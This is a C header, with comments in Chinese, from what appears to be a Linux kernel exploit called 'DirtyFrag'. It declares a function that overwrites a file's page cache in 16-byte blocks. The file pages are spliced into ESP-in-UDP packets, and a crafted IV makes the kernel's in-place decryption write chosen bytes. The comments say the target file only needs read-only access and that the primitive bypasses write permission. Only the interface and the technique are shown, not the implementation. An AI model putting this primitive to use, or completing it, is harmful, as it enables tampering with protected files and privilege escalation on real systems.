/*
 * 把一个文件的页缓存页挂进 UDP skb 并发出去 —— DirtyFrag 的核心动作。
 *
 * 报文布局（RFC 4303 + RFC 3948 ESP-in-UDP）：
 *     [ SPI(4) | Seq(4) | IV(16) | 密文(16) | ICV(icv_len) ]
 *                                   ^^^^^^^^ 这一段是**文件页缓存本身**，
 * 由 splice(2) 直接从文件挂进 pipe，不经过任何用户态缓冲 —— 这样 skb 的
 * frag 才指向页缓存页，内核就地解密的结果才会写回文件。
 * 若换成 memcpy/sendmsg，内核只会操作载荷副本，页缓存一个字节都不会变
 * （这正是 S9280 上这条链被证伪的原因，见 FEASIBILITY_VERDICT.md）。
 *
 * IV 由调用方按 `IV = AES_DEC(key, C_old) XOR C_new` 反推，使解密结果正好
 * 等于期望写入的内容。
 */
#ifndef DFR_SPLICE_H
#define DFR_SPLICE_H

#include <stddef.h>
#include <stdint.h>
#include <sys/types.h>

/**
 * 用一页 16 字节的块改写目标文件的页缓存。
 *
 * @param udp_fd    已 connect 到 encap 端口的 UDP socket
 * @param file_fd   目标文件 fd（只读打开即可，原语绕过写权限）
 * @param offset    文件内偏移（须 16 字节对齐）
 * @param spi       与已安装 SA 一致的 SPI
 * @param seq       ESP 序列号
 * @param aes_key   AES-256 密钥（32 字节，与 SA 的 cbc(aes) 一致）
 * @param auth_key  HMAC 密钥（与 SA 的 hmac(sha256) 一致）
 * @param auth_key_len 认证密钥长度（字节）
 * @param icv_len   随包附加的 ICV 字节数（必须等于 SA 的 authsize）
 * @param desired   期望写入的 16 字节内容
 * @return 0 成功；负值为 -errno（或 -EIO 表示 splice 长度不符）
 */
int dfr_write_block16(int udp_fd, int file_fd, off_t offset,
                      uint32_t spi, uint32_t seq,
                      const uint8_t aes_key[32],
                      const uint8_t *auth_key, size_t auth_key_len,
                      int icv_len,
                      const uint8_t desired[16]);

#endif /* DFR_SPLICE_H */
